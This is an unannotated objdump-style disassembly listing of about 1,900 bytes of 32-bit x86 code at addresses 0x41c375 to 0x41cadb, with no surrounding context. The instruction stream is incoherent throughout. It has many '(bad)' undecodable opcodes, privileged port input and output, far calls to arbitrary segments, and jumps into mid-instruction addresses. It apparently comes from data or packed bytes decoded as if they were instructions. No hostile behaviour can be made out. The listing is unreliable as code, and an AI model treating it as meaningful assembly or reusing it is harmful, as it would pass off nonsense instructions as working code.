  41c375:	xchg   esi,eax
  41c376:	and    esp,DWORD PTR [esi+0x50]
  41c379:	xor    DWORD PTR [edi+0x4142855e],0x9
  41c380:	adc    eax,0xbef67674
  41c385:	mov    ebp,0x76b4c1a2
  41c38a:	add    DWORD PTR [ebp-0x3d0b2d96],0x78
  41c391:	cmp    ebp,edi
  41c393:	or     DWORD PTR [edi],eax
  41c395:	cmp    edi,ecx
  41c397:	mul    DWORD PTR [ebx]
  41c399:	mov    eax,0x9894bf5c
  41c39e:	adc    bh,BYTE PTR ss:[ecx+0x3d2530b1]
  41c3a5:	sub    DWORD PTR [edx+0x3607cfad],eax
  41c3ab:	xchg   ecx,eax
  41c3ac:	xchg   ecx,eax
  41c3ad:	bound  edx,QWORD PTR ds:0x485b6fcb
  41c3b3:	sbb    dl,BYTE PTR [edx+0x63]
  41c3b6:	dec    eax
  41c3b7:	seta   BYTE PTR [edx+0x40f1741c]
  41c3be:	cmp    dl,BYTE PTR [ecx]
  41c3c0:	xchg   ebp,eax
  41c3c1:	sbb    edi,esi
  41c3c3:	dec    ebx
  41c3c4:	or     al,0xd1
  41c3c6:	mov    ah,0x15
  41c3c8:	test   al,0x3a
  41c3ca:	mov    dh,bh
  41c3cc:	int3   
  41c3cd:	das    
  41c3ce:	es mov edx,0xf6736815
  41c3d4:	fnstenv [ebp+0x1f73d4e9]
  41c3da:	(bad)  
  41c3db:	sub    BYTE PTR [ebp+0x2b8dcb4f],cl
  41c3e1:	out    dx,al
  41c3e2:	and    DWORD PTR [ebx+0xb],edi
  41c3e5:	sub    BYTE PTR [ecx],dl
  41c3e7:	aad    0xa4
  41c3e9:	pop    esi
  41c3ea:	mov    ds:0xc1c7307b,eax
  41c3ef:	sbb    al,0x41
  41c3f1:	push   ebp
  41c3f2:	mov    eax,ds:0x355ef0c2
  41c3f7:	or     eax,edi
  41c3f9:	add    eax,0xf3dac260
  41c3fe:	mul    edx
  41c400:	loopne 0x41c3cc
  41c402:	in     eax,0xb0
  41c404:	xor    DWORD PTR [edx+edi*8],eax
  41c407:	stc    
  41c408:	inc    esi
  41c409:	aad    0x97
  41c40b:	sar    DWORD PTR [ecx],0xfd
  41c40e:	popa   
  41c40f:	call   0x3c3d:0x84746fba
  41c416:	push   eax
  41c417:	jne    0x41c42c
  41c419:	push   ds
  41c41a:	pop    ebx
  41c41b:	ret    0x9a13
  41c41e:	gs mov cs,ecx
  41c421:	das    
  41c422:	lods   eax,DWORD PTR ds:[esi]
  41c423:	pop    ecx
  41c424:	mov    BYTE PTR [eax-0x17ea16b3],dl
  41c42a:	lahf   
  41c42b:	push   ss
  41c42c:	adc    eax,0x493b18cd
  41c431:	mov    bl,0x7f
  41c433:	(bad)  
  41c434:	mov    edi,0x94e439e4
  41c439:	fs retfw 0x494b
  41c43e:	dec    eax
  41c43f:	arpl   WORD PTR [edx+0x2e3ca0cc],sp
  41c445:	cwde   
  41c446:	push   ds
  41c447:	sar    DWORD PTR [edi],0xe2
  41c44a:	std    
  41c44b:	push   es
  41c44c:	jge    0x41c41e
  41c44e:	or     eax,0xd821c8f7
  41c453:	in     eax,0x87
  41c455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c456:	inc    ebp
  41c457:	mov    eax,0xeadce30b
  41c45c:	jbe    0x41c4a2
  41c45e:	cmc    
  41c45f:	pop    eax
  41c460:	mov    ebx,0x14544661
  41c465:	fs dec edx
  41c467:	push   ebx
  41c468:	inc    esp
  41c469:	xchg   DWORD PTR [edi],ebx
  41c46b:	out    0x2d,al
  41c46d:	mov    ds:0x2c47dfea,eax
  41c472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c473:	retf   0x2506
  41c476:	mov    ebp,fs
  41c478:	pusha  
  41c479:	out    0xe5,al
  41c47b:	adc    BYTE PTR [ebx],dh
  41c47d:	int    0x6f
  41c47f:	adc    al,0x98
  41c481:	sbb    al,0x42
  41c483:	stc    
  41c484:	xchg   ebp,eax
  41c485:	xchg   edi,eax
  41c486:	gs add bl,ch
  41c489:	add    al,0xc3
  41c48b:	jnp    0x41c507
  41c48d:	ret    0x6e8c
  41c490:	add    ch,BYTE PTR [eax+esi*1]
  41c493:	test   BYTE PTR [ebp+0xb],0xc2
  41c497:	jmp    0x70af:0xb435178b
  41c49e:	or     DWORD PTR [edx+0x568b04b8],esi
  41c4a4:	pop    ecx
  41c4a5:	inc    ecx
  41c4a6:	in     eax,0x8b
  41c4a8:	dec    eax
  41c4a9:	cmc    
  41c4aa:	sahf   
  41c4ab:	(bad)  
  41c4ac:	clc    
  41c4ad:	jbe    0x41c4ff
  41c4af:	stc    
  41c4b0:	retf   
  41c4b1:	pushaw 
  41c4b3:	lea    ebx,[esi+0x1c]
  41c4b6:	sbb    eax,0xa23a3ee1
  41c4bb:	and    dh,BYTE PTR [edi]
  41c4bd:	call   0x6674bb3b
  41c4c2:	inc    DWORD PTR [ecx]
  41c4c4:	out    dx,eax
  41c4c5:	mov    edx,0x3d604bea
  41c4ca:	int3   
  41c4cb:	push   ecx
  41c4cc:	inc    eax
  41c4cd:	adc    BYTE PTR [eax-0x1fbea556],dl
  41c4d3:	sbb    ebx,edi
  41c4d5:	scas   eax,DWORD PTR es:[edi]
  41c4d6:	rcr    BYTE PTR [edi+ebx*8-0x78],1
  41c4da:	xchg   esi,eax
  41c4db:	cmp    eax,0xf4605f13
  41c4e0:	jae    0x41c48a
  41c4e2:	mov    ah,0x4
  41c4e4:	xchg   BYTE PTR [edx+0x15ebfe2e],bl
  41c4ea:	adc    al,0x1c
  41c4ec:	sbb    ebx,DWORD PTR [esi+eiz*4]
  41c4ef:	push   0x18
  41c4f1:	aad    0x92
  41c4f3:	inc    esi
  41c4f4:	adc    BYTE PTR [edi+0x2ebe5643],0xb1
  41c4fb:	adc    al,0xcf
  41c4fd:	push   ss
  41c4fe:	mov    ebx,DWORD PTR [edx+0x7e212420]
  41c504:	inc    edi
  41c505:	push   ss
  41c506:	clc    
  41c507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c508:	mov    cl,0x45
  41c50a:	jle    0x41c49a
  41c50c:	nop
  41c50d:	cmp    DWORD PTR [ebp+0x7a93a3c4],esi
  41c513:	loop   0x41c518
  41c515:	scas   eax,DWORD PTR es:[edi]
  41c516:	ins    BYTE PTR es:[edi],dx
  41c517:	iret   
  41c518:	sbb    ecx,DWORD PTR [ebx-0x10879575]
  41c51e:	mov    WORD PTR [edi-0x21e95e8f],es
  41c524:	or     cl,ch
  41c526:	sbb    eax,0x99913989
  41c52b:	mov    ebp,0xd648a958
  41c530:	lods   eax,DWORD PTR ds:[esi]
  41c531:	std    
  41c532:	push   edi
  41c533:	loopne 0x41c4fe
  41c535:	or     esp,ecx
  41c537:	or     esi,0xd7e1d235
  41c53d:	inc    esi
  41c53e:	jnp    0x41c4dc
  41c540:	sbb    ebp,DWORD PTR [ebx]
  41c542:	mov    edx,DWORD PTR gs:[edx+esi*2-0x777cb034]
  41c54a:	adc    eax,0x536430d8
  41c54f:	add    al,0x9f
  41c551:	jge    0x41c5cf
  41c553:	lods   eax,DWORD PTR ds:[esi]
  41c554:	ja     0x41c57f
  41c556:	mov    gs,WORD PTR [edi+0x761505da]
  41c55c:	mov    dl,0x35
  41c55e:	lahf   
  41c55f:	out    0xc4,al
  41c561:	inc    ebx
  41c562:	pop    es
  41c563:	pop    ebx
  41c564:	mov    cl,0x44
  41c566:	push   es
  41c567:	(bad)  
  41c569:	ins    BYTE PTR es:[edi],dx
  41c56a:	pop    eax
  41c56b:	and    al,0x3
  41c56d:	scas   eax,DWORD PTR es:[edi]
  41c56e:	mov    ebx,0x7fcd3c58
  41c573:	fs mov ch,0xc5
  41c576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c577:	sar    BYTE PTR ds:0x82610744,1
  41c57d:	add    eax,0x5bb8f55b
  41c582:	stos   DWORD PTR es:[edi],eax
  41c583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c584:	add    DWORD PTR [ecx+0x402f7e47],0x5f3e9f02
  41c58e:	popf   
  41c58f:	or     DWORD PTR [esi+0x468e0ca3],eax
  41c595:	dec    esi
  41c596:	pop    edx
  41c597:	fs push es
  41c599:	(bad)  [edx-0x4a]
  41c59c:	ins    BYTE PTR es:[edi],dx
  41c59d:	push   eax
  41c59e:	into   
  41c59f:	cli    
  41c5a0:	pop    edi
  41c5a1:	push   ss
  41c5a2:	mov    ch,0x83
  41c5a4:	mov    ebp,0x9e03346
  41c5a9:	cmp    BYTE PTR [ebx+0x1e1f748f],0x90
  41c5b0:	cmp    BYTE PTR [edi+0x43a267e9],dh
  41c5b6:	out    dx,al
  41c5b7:	fsubr  DWORD PTR [ebx-0x252e451b]
  41c5bd:	es popa 
  41c5bf:	mov    bh,0x5b
  41c5c1:	leave  
  41c5c2:	jmp    0x6eb10f0a
  41c5c7:	bound  esp,QWORD PTR ds:0x5676f21a
  41c5cd:	mov    al,ds:0x85c486ac
  41c5d2:	pop    ebp
  41c5d3:	mov    eax,DWORD PTR [edx+0x6b120097]
  41c5d9:	out    dx,eax
  41c5da:	aad    0xa5
  41c5dc:	add    dh,cl
  41c5de:	int3   
  41c5df:	and    bh,bh
  41c5e1:	pop    ebp
  41c5e2:	and    dl,BYTE PTR [ebp+0x5a]
  41c5e5:	jae    0x41c5e9
  41c5e7:	das    
  41c5e8:	sbb    BYTE PTR [ebx-0x65],dl
  41c5eb:	pop    esp
  41c5ec:	test   BYTE PTR [ecx-0x45c7db6d],0xdd
  41c5f3:	dec    esi
  41c5f4:	fdiv   st(2),st
  41c5f6:	cwde   
  41c5f7:	xlat   BYTE PTR ds:[ebx]
  41c5f8:	gs aam 0xb
  41c5fb:	(bad)  
  41c5fc:	pop    ecx
  41c5fd:	inc    esi
  41c5fe:	jp     0x41c664
  41c600:	sub    ecx,DWORD PTR [edi]
  41c602:	lods   eax,DWORD PTR ds:[esi]
  41c603:	pop    ss
  41c604:	lods   al,BYTE PTR ds:[esi]
  41c605:	push   ss
  41c606:	ret    0x7070
  41c609:	pop    ss
  41c60a:	lds    esp,FWORD PTR [ecx-0xf]
  41c60d:	xor    eax,0x81f77046
  41c612:	and    ecx,edi
  41c614:	lahf   
  41c615:	or     DWORD PTR [edi],edx
  41c617:	push   0x36f62ba5
  41c61c:	out    dx,eax
  41c61d:	inc    ecx
  41c61e:	out    0x5f,eax
  41c620:	mov    BYTE PTR [ecx-0x52],ah
  41c623:	mov    bh,0xde
  41c625:	retf   
  41c626:	push   ebx
  41c627:	ja     0x41c61c
  41c629:	mov    al,ds:0x8b56acc9
  41c62e:	out    0x8d,al
  41c630:	sbb    eax,0x3e6d1890
  41c635:	pop    esi
  41c636:	mov    eax,ds:0xade7ac65
  41c63b:	cmp    al,0x3f
  41c63d:	sub    cl,ah
  41c63f:	neg    DWORD PTR [edx-0xe2ae825]
  41c645:	pop    ebp
  41c646:	inc    ecx
  41c647:	mov    WORD PTR [esi],es
  41c649:	stos   BYTE PTR es:[edi],al
  41c64a:	mov    edx,0xe8ce44ea
  41c64f:	mov    ch,0x7a
  41c651:	sahf   
  41c652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c653:	dec    ecx
  41c654:	jns    0x41c6c1
  41c656:	test   DWORD PTR [eax],0x4776440e
  41c65c:	dec    edi
  41c65d:	repz mov dl,0x35
  41c660:	mov    eax,ds:0x1417ed86
  41c665:	ss repnz sbb eax,0xbe5840e0
  41c66c:	mov    cs:0x582b2722,al
  41c672:	scas   eax,DWORD PTR es:[edi]
  41c673:	dec    eax
  41c674:	lock scas al,BYTE PTR es:[edi]
  41c676:	cmp    ah,0x3a
  41c679:	or     DWORD PTR [edx],ebp
  41c67b:	lahf   
  41c67c:	repz shl edi,1
  41c67f:	dec    esi
  41c680:	push   ecx
  41c681:	xor    al,0x51
  41c683:	jne    0x41c646
  41c685:	and    ebp,DWORD PTR [ecx]
  41c687:	inc    ebx
  41c688:	push   0x65
  41c68a:	test   BYTE PTR gs:[ecx+0x36],cl
  41c68e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c68f:	jl     0x41c6a8
  41c691:	add    edx,DWORD PTR [ebp-0x6c]
  41c694:	sar    BYTE PTR [edi+0xb70441a],1
  41c69a:	imul   ecx,DWORD PTR [edi+0x5e],0xffffffaa
  41c69e:	lea    esp,[esp+ecx*8+0x1249271e]
  41c6a5:	aam    0x2b
  41c6a7:	dec    ecx
  41c6a8:	ins    DWORD PTR es:[edi],dx
  41c6a9:	loop   0x41c63c
  41c6ab:	imul   esp,DWORD PTR [ebx+0x1a709042],0x42
  41c6b2:	dec    ebp
  41c6b3:	mov    eax,ds:0x811acf19
  41c6b8:	aad    0x1b
  41c6ba:	jb     0x41c707
  41c6bc:	cmp    eax,0xeccb6ee9
  41c6c1:	mov    ah,0x2d
  41c6c3:	adc    DWORD PTR [esi-0x48],edi
  41c6c6:	les    ebx,FWORD PTR [esi]
  41c6c8:	mov    al,ds:0x6b856273
  41c6cd:	std    
  41c6ce:	aaa    
  41c6cf:	popa   
  41c6d0:	jp     0x41c67b
  41c6d2:	btr    esi,eax
  41c6d5:	mov    edi,0xdc15f5ff
  41c6da:	push   esi
  41c6db:	xchg   esi,eax
  41c6dc:	xor    eax,0xe6093614
  41c6e1:	fnsave [edx-0x3c]
  41c6e4:	ja     0x41c683
  41c6e6:	mov    dl,0x6f
  41c6e8:	push   0x55057f1f
  41c6ed:	or     DWORD PTR [eax],eax
  41c6ef:	xor    esp,DWORD PTR [edx]
  41c6f1:	cli    
  41c6f2:	int    0x24
  41c6f4:	retf   0xf875
  41c6f7:	pop    eax
  41c6f8:	inc    edx
  41c6f9:	and    al,0x83
  41c6fb:	xchg   BYTE PTR [esi-0x5f58184c],cl
  41c701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c702:	push   edi
  41c703:	rol    DWORD PTR [edx+edx*1],1
  41c706:	and    eax,0xbe4fdf5c
  41c70b:	out    dx,al
  41c70c:	pop    ecx
  41c70d:	inc    esp
  41c70e:	arpl   WORD PTR [esi],bx
  41c710:	cmp    al,0x36
  41c712:	pusha  
  41c713:	fwait
  41c714:	(bad)  
  41c715:	xor    al,0x80
  41c717:	fsubr  DWORD PTR [ecx+0x74]
  41c71a:	sub    eax,0xa3f4732e
  41c71f:	rcr    DWORD PTR [ecx],1
  41c721:	imul   ecx,DWORD PTR [ecx],0x990a9bce
  41c727:	repnz test al,0x43
  41c72a:	xlat   BYTE PTR ds:[ebx]
  41c72b:	push   ds
  41c72c:	js     0x41c76f
  41c72e:	in     al,0xed
  41c730:	add    bl,dh
  41c732:	adc    eax,0xa42f6c5f
  41c737:	cmp    bh,BYTE PTR [edx]
  41c739:	test   al,0x51
  41c73b:	ins    DWORD PTR es:[edi],dx
  41c73c:	inc    edi
  41c73d:	in     eax,0xf7
  41c73f:	cmp    dh,BYTE PTR [ecx+ecx*1+0x71]
  41c743:	or     ebp,DWORD PTR [ebx]
  41c745:	rol    BYTE PTR [ebp-0x74fe4ecd],1
  41c74b:	mov    edi,0xb747c747
  41c750:	or     BYTE PTR [eax+0x34],ah
  41c753:	lods   al,BYTE PTR ds:[esi]
  41c754:	xchg   edi,eax
  41c755:	mov    dl,0x2
  41c757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c758:	jae    0x41c707
  41c75a:	and    BYTE PTR [edi-0x5],dl
  41c75d:	xchg   esp,eax
  41c75e:	sbb    edi,ebp
  41c760:	ror    DWORD PTR [eax-0x3047e3fa],cl
  41c766:	pop    ds
  41c767:	nop
  41c768:	mov    ch,0x20
  41c76a:	bnd jl 0x41c7a3
  41c76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c76e:	or     DWORD PTR [ecx],ecx
  41c770:	or     al,0x77
  41c772:	(bad)  
  41c773:	xor    DWORD PTR [edx-0x5cf904ff],ecx
  41c779:	push   es
  41c77a:	addr16 cwde 
  41c77c:	cmp    ah,BYTE PTR [ebp+0x7cdd44f2]
  41c782:	call   0xe226f462
  41c787:	into   
  41c788:	jle    0x41c790
  41c78a:	enter  0xe9ae,0x5e
  41c78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c78f:	aam    0x2b
  41c791:	or     edi,edx
  41c793:	push   edx
  41c794:	fadd   QWORD PTR [si+0x6ef8]
  41c799:	dec    ebx
  41c79a:	pop    ecx
  41c79b:	leave  
  41c79c:	xchg   DWORD PTR [ebx],edi
  41c79e:	mov    ds:0xdeff0334,eax
  41c7a3:	test   al,0xa1
  41c7a5:	xchg   BYTE PTR [ebp-0x69],bl
  41c7a8:	call   0xc331:0x7c399d45
  41c7af:	sbb    al,0x82
  41c7b1:	sbb    BYTE PTR [ebx+0x13],bl
  41c7b4:	sbb    ebp,DWORD PTR [ecx-0x4c54ff0e]
  41c7ba:	lods   eax,DWORD PTR ds:[esi]
  41c7bb:	imul   ecx,eax,0xf4876fe9
  41c7c1:	cvtpi2ps xmm6,QWORD PTR [eax]
  41c7c4:	ins    DWORD PTR es:[edi],dx
  41c7c5:	aad    0x34
  41c7c7:	std    
  41c7c8:	push   eax
  41c7c9:	jl     0x41c791
  41c7cb:	xor    dl,bl
  41c7cd:	retf   0xf59f
  41c7d0:	mov    edi,ecx
  41c7d2:	inc    esi
  41c7d3:	jl     0x41c81f
  41c7d5:	sahf   
  41c7d6:	pop    edx
  41c7d7:	ret    
  41c7d8:	sub    al,0xe0
  41c7da:	inc    edi
  41c7db:	jmp    0x41c7c6
  41c7dd:	shl    BYTE PTR [edi+0x44815987],1
  41c7e3:	inc    ebp
  41c7e4:	loopne 0x41c78a
  41c7e6:	leave  
  41c7e7:	sub    eax,0x736f2c95
  41c7ec:	mov    bl,0x8c
  41c7ee:	jge    0x41c7c5
  41c7f0:	push   esi
  41c7f1:	aad    0xf4
  41c7f3:	int    0x9
  41c7f5:	retf   0xa803
  41c7f8:	or     al,0xda
  41c7fa:	aad    0x6d
  41c7fc:	aaa    
  41c7fd:	icebp  
  41c7fe:	add    ah,BYTE PTR [edi+0x585d9fff]
  41c804:	cld    
  41c805:	sub    BYTE PTR [eax-0xf],bl
  41c808:	inc    ecx
  41c809:	jo     0x41c86c
  41c80b:	shr    BYTE PTR ds:0x11ab84f9,1
  41c811:	test   ebx,esi
  41c813:	jnp    0x41c840
  41c815:	jp     0x41c7de
  41c817:	shl    BYTE PTR [esi],0xad
  41c81a:	scas   al,BYTE PTR es:[edi]
  41c81b:	scas   eax,DWORD PTR es:[edi]
  41c81c:	push   cs
  41c81d:	add    BYTE PTR [eax],al
  41c81f:	mov    dh,0x82
  41c821:	cmp    dh,dl
  41c823:	xor    ah,0x2e
  41c826:	scas   eax,DWORD PTR es:[edi]
  41c827:	xor    eax,DWORD PTR [edx-0x2bdcf28b]
  41c82d:	out    0xd1,al
  41c82f:	ret    0xe124
  41c832:	and    BYTE PTR [edi],dh
  41c834:	std    
  41c835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c836:	pop    esp
  41c837:	ss inc esp
  41c839:	idiv   BYTE PTR [edx]
  41c83b:	push   edx
  41c83c:	ja     0x41c805
  41c83e:	xor    eax,0xd088a543
  41c843:	xor    DWORD PTR [esi],ebp
  41c845:	in     eax,0x55
  41c847:	pushw  ds
  41c849:	mov    eax,0x62edbbc1
  41c84e:	inc    esp
  41c84f:	shl    DWORD PTR [ebx],1
  41c851:	or     BYTE PTR [ebx-0x78],ah
  41c854:	xchg   edi,eax
  41c855:	int3   
  41c856:	outs   dx,DWORD PTR ds:[esi]
  41c857:	dec    BYTE PTR [esi+eax*8+0x32]
  41c85b:	lds    edi,FWORD PTR [ecx-0x43]
  41c85e:	sbb    eax,0x7585fa29
  41c863:	push   ss
  41c864:	adc    DWORD PTR [edx-0x228b66ba],0xffffff92
  41c86b:	mov    al,0x55
  41c86d:	mov    ebp,0x5bb8a9db
  41c872:	mov    ebp,0xb151984
  41c877:	(bad)  
  41c878:	cld    
  41c879:	xor    bh,ch
  41c87b:	(bad)  [eax-0x1c]
  41c87e:	inc    edi
  41c87f:	xor    DWORD PTR [ebx],edi
  41c881:	xor    esp,esp
  41c883:	mov    ebp,0xa839e261
  41c888:	rcr    DWORD PTR [ebp+0x1776aca1],1
  41c88e:	scas   al,BYTE PTR es:[edi]
  41c88f:	sub    eax,0x66e6b277
  41c894:	and    DWORD PTR [ebp+0x3a],ebp
  41c897:	sbb    cl,0x3e
  41c89a:	inc    ebx
  41c89b:	mov    esi,0x810db9f9
  41c8a0:	push   ebp
  41c8a1:	xchg   BYTE PTR [edi],bl
  41c8a3:	lock mov ebx,0xe2b338cf
  41c8a9:	int3   
  41c8aa:	pop    esp
  41c8ab:	cld    
  41c8ac:	addr16 cld 
  41c8ae:	aad    0x17
  41c8b0:	push   ebp
  41c8b1:	test   eax,0x643947a3
  41c8b6:	les    edx,FWORD PTR [eax-0x152c1f2f]
  41c8bc:	mov    esi,DWORD PTR [ebp+0x6c]
  41c8bf:	add    BYTE PTR ss:[ecx+0x29f7d9eb],0xb3
  41c8c7:	jg     0x41c8b9
  41c8c9:	(bad)  
  41c8ca:	jae    0x41c8e0
  41c8cc:	test   ebx,0x39489f4
  41c8d2:	shl    BYTE PTR [ecx-0x186b94a9],cl
  41c8d8:	xor    DWORD PTR [esp+ebx*8-0x45],esi
  41c8dc:	xor    dh,BYTE PTR [eax]
  41c8de:	call   0x2db3:0x5fc03e24
  41c8e5:	(bad)  
  41c8e6:	mov    DWORD PTR [esi],0xce925208
  41c8ec:	(bad)  
  41c8ed:	and    edx,esi
  41c8ef:	pusha  
  41c8f0:	xor    al,BYTE PTR [edx-0x741db98c]
  41c8f6:	and    DWORD PTR [edi-0x77],0xc7821cfe
  41c8fd:	leave  
  41c8fe:	aaa    
  41c8ff:	stc    
  41c900:	inc    ecx
  41c901:	pop    ecx
  41c902:	adc    al,0x49
  41c904:	shl    DWORD PTR [edi],0xfe
  41c907:	sbb    ah,BYTE PTR [edi*1+0x471f40af]
  41c90e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c90f:	clc    
  41c910:	sub    al,0x8c
  41c912:	aam    0xd8
  41c914:	outs   dx,BYTE PTR ds:[esi]
  41c915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c916:	jecxz  0x41c91c
  41c918:	jae    0x41c8d9
  41c91a:	inc    ecx
  41c91b:	or     ebp,DWORD PTR [esi*8-0x1e006839]
  41c922:	shl    BYTE PTR [edx],0x47
  41c925:	les    edi,FWORD PTR [ecx]
  41c927:	aad    0xa
  41c929:	call   0xaef74de7
  41c92e:	pop    eax
  41c92f:	xchg   esp,eax
  41c930:	push   es
  41c931:	fild   QWORD PTR [edx]
  41c933:	xor    eax,esp
  41c935:	enter  0xbe03,0x43
  41c939:	xchg   BYTE PTR [eax+0x75ab85d7],bl
  41c93f:	jnp    0x41c912
  41c941:	sub    eax,edx
  41c943:	cmp    BYTE PTR fs:[eax],dl
  41c946:	fs ret 0xff84
  41c94a:	fst    QWORD PTR [eax+0x36]
  41c94d:	repz (bad) 
  41c94f:	rep outs dx,DWORD PTR ds:[esi]
  41c951:	lods   al,BYTE PTR ds:[esi]
  41c952:	es jne 0x41c90d
  41c955:	xchg   esi,eax
  41c956:	or     eax,0x4955288e
  41c95b:	mov    esp,0x17020f69
  41c960:	shl    BYTE PTR [eax-0x42149063],0x3
  41c967:	fstp   QWORD PTR [edi+0x956cad6]
  41c96d:	xchg   ebx,eax
  41c96e:	sbb    BYTE PTR [ecx-0xd],cl
  41c971:	dec    ebp
  41c972:	jg     0x41c9b4
  41c974:	aad    0xd1
  41c976:	fwait
  41c977:	add    edx,DWORD PTR gs:[esi]
  41c97a:	test   DWORD PTR [ecx+0x6a],ebp
  41c97d:	dec    eax
  41c97e:	xor    al,0x6e
  41c980:	pop    ss
  41c981:	or     eax,DWORD PTR [ecx+0x2d]
  41c984:	xchg   BYTE PTR [eax-0x451141ab],bl
  41c98a:	lock and cl,BYTE PTR [ecx-0x5c]
  41c98e:	xor    BYTE PTR [edx-0x4c],ch
  41c991:	fst    QWORD PTR [esi+0x2]
  41c994:	outs   dx,BYTE PTR ds:[esi]
  41c995:	sub    eax,0x3453ceed
  41c99a:	jmp    0xab2e9ece
  41c99f:	(bad)  
  41c9a0:	push   ss
  41c9a1:	or     ecx,DWORD PTR [ebx+eiz*4]
  41c9a4:	inc    ebp
  41c9a5:	xor    esi,ebp
  41c9a7:	(bad)  
  41c9a8:	push   ebp
  41c9a9:	aam    0xea
  41c9ab:	dec    esp
  41c9ac:	push   ss
  41c9ad:	add    DWORD PTR [ebx],ebp
  41c9af:	jmp    0xdf41a3de
  41c9b4:	neg    DWORD PTR [edi+0xde00fd]
  41c9ba:	xor    BYTE PTR [bx+di-0x339a],al
  41c9bf:	in     al,0xbd
  41c9c1:	xchg   esp,eax
  41c9c2:	adc    DWORD PTR [ebp+0x7ec8bf97],esp
  41c9c8:	sahf   
  41c9c9:	jb     0x41c94d
  41c9cb:	stos   DWORD PTR es:[edi],eax
  41c9cc:	inc    esp
  41c9cd:	lods   eax,DWORD PTR ds:[esi]
  41c9ce:	ret    
  41c9cf:	pushf  
  41c9d0:	fwait
  41c9d1:	lahf   
  41c9d2:	ret    
  41c9d3:	cdq    
  41c9d4:	jl     0x41c96d
  41c9d6:	sub    esp,DWORD PTR [edi+0xa]
  41c9d9:	call   0x35cba790
  41c9de:	sbb    DWORD PTR [edx-0x136daa5e],edi
  41c9e4:	lock xchg ebp,eax
  41c9e6:	sub    ecx,DWORD PTR [esi+0x38ce8200]
  41c9ec:	sbb    bh,dl
  41c9ee:	and    edx,DWORD PTR [ecx+0x64]
  41c9f1:	pop    ds
  41c9f2:	xchg   esi,eax
  41c9f3:	or     BYTE PTR [eax+0x74],al
  41c9f6:	pop    edi
  41c9f7:	add    al,0x42
  41c9f9:	mov    DWORD PTR [ecx+0x673d2697],ebp
  41c9ff:	inc    BYTE PTR [edx+0x59]
  41ca02:	pop    ebx
  41ca03:	(bad)  
  41ca05:	into   
  41ca06:	enter  0x6b3c,0xad
  41ca0a:	jmp    0xd13cd5cd
  41ca0f:	mov    bl,0x5
  41ca11:	jae    0x41c9d7
  41ca13:	ret    0xe9d3
  41ca16:	pop    esi
  41ca17:	repz fisttp QWORD PTR [edi]
  41ca1a:	mov    bx,0xe3ae
  41ca1e:	jmp    0x41ca5e
  41ca20:	jae    0x41ca0e
  41ca22:	push   ds
  41ca23:	clc    
  41ca24:	lahf   
  41ca25:	mov    esi,0x69ab3941
  41ca2a:	inc    ebp
  41ca2b:	retf   
  41ca2c:	int    0x2d
  41ca2e:	ds cld 
  41ca30:	mov    ebx,edx
  41ca32:	mov    eax,0xfebf660a
  41ca37:	daa    
  41ca38:	lods   eax,DWORD PTR ds:[esi]
  41ca39:	rcl    DWORD PTR [esi],cl
  41ca3b:	mov    ds:0xe144fa45,eax
  41ca40:	push   edx
  41ca41:	mov    ds:0x2049e038,al
  41ca46:	(bad)  
  41ca48:	inc    ebp
  41ca49:	nop
  41ca4a:	popf   
  41ca4b:	dec    ebx
  41ca4c:	popa   
  41ca4d:	in     al,0x30
  41ca4f:	pop    esi
  41ca50:	jmp    0x5be04e2c
  41ca55:	scas   al,BYTE PTR es:[edi]
  41ca56:	adc    ah,cl
  41ca58:	(bad)  
  41ca59:	into   
  41ca5a:	mov    bh,BYTE PTR [edx-0x2c]
  41ca5d:	cmp    edx,DWORD PTR [edi-0x8da3bf]
  41ca63:	inc    ebx
  41ca64:	leave  
  41ca65:	or     al,0xdb
  41ca67:	adc    esp,DWORD PTR [edx]
  41ca69:	loope  0x41ca0f
  41ca6b:	std    
  41ca6c:	les    eax,FWORD PTR [eax+0x5b]
  41ca6f:	sbb    cl,BYTE PTR [ebx]
  41ca71:	test   eax,0x1e867245
  41ca76:	sub    BYTE PTR [edi],al
  41ca78:	or     DWORD PTR [ebx-0x1c],eax
  41ca7b:	sbb    al,0xe8
  41ca7d:	pop    ecx
  41ca7e:	fs (bad) 
  41ca80:	mov    dl,0x7
  41ca82:	dec    edi
  41ca83:	shr    ebp,1
  41ca85:	aad    0xcd
  41ca87:	or     ah,al
  41ca89:	add    DWORD PTR [edx-0x17],eax
  41ca8c:	push   edx
  41ca8d:	(bad)  
  41ca8e:	jo     0x41caaf
  41ca90:	add    BYTE PTR [ebx+0x62196708],0x4e
  41ca97:	pusha  
  41ca98:	xor    ebp,esp
  41ca9a:	push   ds
  41ca9b:	(bad)  
  41ca9c:	push   ds
  41ca9d:	js     0x41cab3
  41ca9f:	xchg   edi,eax
  41caa0:	sahf   
  41caa1:	cs sbb al,0xc3
  41caa4:	and    BYTE PTR [edi],ah
  41caa6:	xchg   esp,eax
  41caa7:	and    al,0x43
  41caa9:	(bad)
  41caad:	inc    edx
  41caae:	sub    eax,0x430ea678
  41cab3:	cmp    BYTE PTR [esi+0x1b],bl
  41cab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cab7:	sbb    al,0x89
  41cab9:	and    eax,0x894e7480
  41cabe:	push   esp
  41cabf:	xchg   cl,cl
  41cac1:	mov    ah,0xe5
  41cac3:	daa    
  41cac4:	sbb    DWORD PTR [ecx-0x3515c20f],0x30
  41cacb:	test   eax,0x4ad0af86
  41cad0:	stos   DWORD PTR es:[edi],eax
  41cad1:	pop    ds
  41cad2:	dec    ebx
  41cad3:	push   ds
  41cad4:	ins    DWORD PTR es:[edi],dx
  41cad5:	sbb    edx,DWORD PTR [edx]
  41cad7:	icebp  
  41cad8:	int    0x84
  41cada:	clc    
  41cadb:	cld    
